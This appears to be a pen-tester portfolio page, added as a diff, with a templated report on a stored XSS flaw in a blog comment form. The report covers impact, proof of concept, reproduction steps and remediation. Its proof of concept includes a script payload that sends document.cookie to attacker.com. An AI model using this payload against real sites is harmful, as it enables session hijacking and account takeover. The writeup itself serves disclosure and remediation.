@@ -1,0 +1,253 @@
+<!doctype html>
+<html lang="en">
+	<head>
+		<meta charset="UTF-8" />
+		<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+		<meta
+			name="description"
+			content="HEXEN - Penetration Tester & Penetration Tester Portfolio"
+		/>
+		<title>HEXEN // CYBERPUNK PEN-TESTER PORTFOLIO</title>
+		<link rel="stylesheet" href="../assets/css/writeups.css" />
+	</head>
+
+	<body class="cyberpunk-body">
+		<!-- Matrix Rain Background -->
+		<div id="matrix-rain" class="matrix-rain"></div>
+
+		<!-- Grid Background -->
+		<div class="grid-bg fixed top-0 left-0 w-full h-full z-0"></div>
+
+		<!-- Scanlines -->
+		<div
+			class="scanlines fixed top-0 left-0 w-full h-full pointer-events-none z-0"
+		></div>
+
+		<!-- Navigation -->
+		<nav
+			class="cyber-nav fixed top-0 left-0 w-full z-50 bg-black bg-opacity-80 backdrop-blur-sm border-b border-neongreen"
+		>
+			<div class="container mx-auto px-4 py-3">
+				<div class="flex justify-between items-center">
+					<div class="cyber-logo">
+						<span
+							class="text-neongreen font-bold text-xl glitch-effect"
+							data-text="HEXEN"
+							>HEXENNNNNNNN</span
+						>
+						<span class="text-neonpink text-sm ml-2"
+							>// SECURITY_SPECIALIST</span
+						>
+					</div>
+
+					<!-- Desktop Menu -->
+					<div class="hidden md:flex space-x-6">
+						<a href="../index.html" class="nav-link">HOME</a>
+						<a href="../about.html" class="nav-link">ABOUT</a>
+						<a href="../writeups.html" class="nav-link">WRITEUPS</a>
+						<a href="../blogs.html" class="nav-link">BLOGS</a>
+					</div>
+
+					<!-- Mobile Menu Button -->
+					<div class="md:hidden mt-4">
+						<button
+							id="mobile-menu-button"
+							type="button"
+							class="text-neongreen focus:outline-none"
+						>
+							<svg
+								class="h-6 w-6 transition-transform duration-300"
+								id="menu-icon"
+								fill="none"
+								viewBox="0 0 24 24"
+								stroke="currentColor"
+							>
+								<path
+									stroke-linecap="round"
+									stroke-linejoin="round"
+									stroke-width="2"
+									d="M4 6h16M4 12h16M4 18h16"
+								></path>
+							</svg>
+							<svg
+								class="h-6 w-6 transition-transform duration-300 hidden"
+								id="close-icon"
+								fill="none"
+								viewBox="0 0 24 24"
+								stroke="currentColor"
+							>
+								<path
+									stroke-linecap="round"
+									stroke-linejoin="round"
+									stroke-width="2"
+									d="M6 18L18 6M6 6l12 12"
+								></path>
+							</svg>
+						</button>
+					</div>
+				</div>
+
+				<!-- Mobile Menu (hidden by default) -->
+				<div
+					id="mobile-menu"
+					class="md:hidden mt-2 border-t border-neongreen border-opacity-30 transform origin-top transition-all duration-300 scale-y-0 opacity-0 max-h-0"
+				>
+					<div class="flex flex-col space-y-4">
+						<a href="../index.html" class="nav-link">HOME</a>
+						<a href="../about.html" class="nav-link">ABOUT</a>
+						<a href="../writeups.html" class="nav-link">WRITEUPS</a>
+						<a href="../blogs.html" class="nav-link">BLOGS</a>
+					</div>
+				</div>
+			</div>
+		</nav>
+
+		<main class="relative z-10 pt-20">
+			<section id="writeup-controls" class="px-6 pt-6 pb-2 text-center">
+  
+
+  <div id='tags-container'>
+    
+  </div>
+</section>
+
+<!-- Writeup content -->
+<article class="markdown-body"><h1>Penetration Testing Writeup: Stored Cross-Site Scripting (XSS) Vulnerability</h1>
+<h2>Executive Summary</h2>
+<p>During a penetration test on [Target Application], a critical Stored Cross-Site
+Scripting (XSS) vulnerability was discovered in the application&#39;s comment
+system. This flaw allows attackers to inject malicious scripts that execute in
+the browsers of all users viewing the affected page, potentially leading to
+account takeover, data theft, or website defacement. This report outlines the
+vulnerability details, impact, proof of concept, and remediation steps.</p>
+<h2>Vulnerability Details</h2>
+<ul>
+<li><strong>Vulnerability Type</strong>: Cross-Site Scripting (XSS) - Stored</li>
+<li><strong>Severity</strong>: Critical</li>
+<li><strong>Affected Component</strong>: Comment submission form on the blog page</li>
+<li><strong>CWE</strong>: CWE-79 (Improper Neutralization of Input During Web Page Generation)</li>
+<li><strong>Location</strong>: <code>https://[target-application]/blog/post/[post-id]#comments</code></li>
+<li><strong>Discovered By</strong>: [PenTester Name]</li>
+<li><strong>Date Discovered</strong>: August 20, 2025</li>
+</ul>
+<h3>Description</h3>
+<p>The comment submission form on the blog page fails to sanitize user inputs
+before storing them in the database. When comments are displayed, the
+application renders the stored data directly into the HTML without proper
+encoding, allowing attackers to embed malicious JavaScript that executes for all
+users viewing the page.</p>
+<h3>Impact</h3>
+<ul>
+<li><strong>Account Takeover</strong>: Attackers can steal session cookies to impersonate
+users.</li>
+<li><strong>Data Exfiltration</strong>: Sensitive user data visible on the page can be sent to
+an attacker-controlled server.</li>
+<li><strong>Malware Distribution</strong>: Malicious scripts can redirect users to phishing or
+malware-laden sites.</li>
+<li><strong>Reputation Damage</strong>: Website defacement can harm the application&#39;s
+credibility.</li>
+</ul>
+<h3>Proof of Concept</h3>
+<ol>
+<li>Navigate to a blog post: <code>https://[target-application]/blog/post/[post-id]</code>.</li>
+<li>In the comment form, submit the payload:
+<code>&lt;script&gt;alert(&#39;Stored XSS&#39;);&lt;/script&gt;</code>.</li>
+<li>Reload the page and observe an alert box with the message &quot;Stored XSS&quot;.</li>
+<li>A malicious payload could be:
+<code>&lt;script&gt;document.location=&#39;https://attacker.com/steal?cookie=&#39;+document.cookie;&lt;/script&gt;</code>
+to exfiltrate cookies.</li>
+</ol>
+<h3>Steps to Reproduce</h3>
+<ol>
+<li>Visit <code>https://[target-application]/blog/post/[post-id]</code>.</li>
+<li>Enter <code>&lt;script&gt;alert(&#39;Stored XSS&#39;);&lt;/script&gt;</code> in the comment form.</li>
+<li>Submit the comment.</li>
+<li>Refresh the page to confirm the alert is triggered for all users.</li>
+</ol>
+<h2>Remediation Recommendations</h2>
+<ol>
+<li><strong>Input Sanitization</strong>:<ul>
+<li>Use a server-side library like OWASP AntiSamy to filter out malicious code
+from user inputs before storage.</li>
+<li>Validate inputs to allow only safe characters (e.g., alphanumeric, limited
+punctuation).</li>
+</ul>
+</li>
+<li><strong>Output Encoding</strong>:<ul>
+<li>Apply HTML entity encoding (e.g., <code>&lt;</code> to <code>&amp;lt;</code>) when rendering comments in
+the browser.</li>
+</ul>
+</li>
+<li><strong>Content Security Policy (CSP)</strong>:<ul>
+<li>Implement a CSP header:
+<code>Content-Security-Policy: script-src &#39;self&#39;; object-src &#39;none&#39;;</code>.</li>
+</ul>
+</li>
+<li><strong>Database Sanitization</strong>:<ul>
+<li>Sanitize stored data to prevent execution of scripts retrieved from the
+database.</li>
+</ul>
+</li>
+<li><strong>Security Training</strong>:<ul>
+<li>Train developers on secure coding to mitigate XSS risks.</li>
+</ul>
+</li>
+</ol>
+<h2>Conclusion</h2>
+<p>The Stored XSS vulnerability in [Target Application]’s comment system is a
+critical issue requiring immediate remediation to protect users and maintain
+trust. Implementing the recommended measures will significantly reduce the risk
+of exploitation.</p>
+<h2>References</h2>
+<ul>
+<li>OWASP XSS Prevention Cheat Sheet:
+<a href="https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html">https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html</a></li>
+<li>CWE-79: <a href="https://cwe.mitre.org/data/definitions/79.html">https://cwe.mitre.org/data/definitions/79.html</a></li>
+</ul>
+<p><img src="https://example.com/images/stored-xss-alert.png" alt="Stored XSS Alert"></p>
+</article>
+
+			<!-- Footer -->
+			<footer
+				class="cyber-footer py-12 bg-black border-t border-gray-800 mt-12"
+			>
+				<div class="container mx-auto px-4">
+					<div class="flex flex-col md:flex-row justify-between items-center">
+						<div class="mb-6 md:mb-0">
+							<h3 class="text-2xl font-bold mb-2 text-neongreen">HEXEN_SEC</h3>
+							<p class="text-sm text-gray-400 cyber-text">
+								Penetration Testing & Security Consulting
+							</p>
+						</div>
+						<div class="flex space-x-6">
+							<a
+								href="#"
+								class="hover:text-neongreen transition-colors cyber-link"
+								>Imprint</a
+							>
+							<a
+								href="#"
+								class="hover:text-neonpink transition-colors cyber-link"
+								>Privacy</a
+							>
+							<a
+								href="#"
+								class="hover:text-neonblue transition-colors cyber-link"
+								>Legal</a
+							>
+						</div>
+					</div>
+					<div
+						class="border-t border-gray-800 mt-8 pt-8 text-center text-sm text-gray-400"
+					>
+						<p class="cyber-text">
+							© 2025 HEXEN. All systems operational.
+							<span class="text-neongreen">//</span> Secure by design.
+						</p>
+					</div>
+				</div>
+			</footer>
+		</main>
+		<script type="module" src="../assets/js/menu.js" defer></script>
+	</body>
+</html>
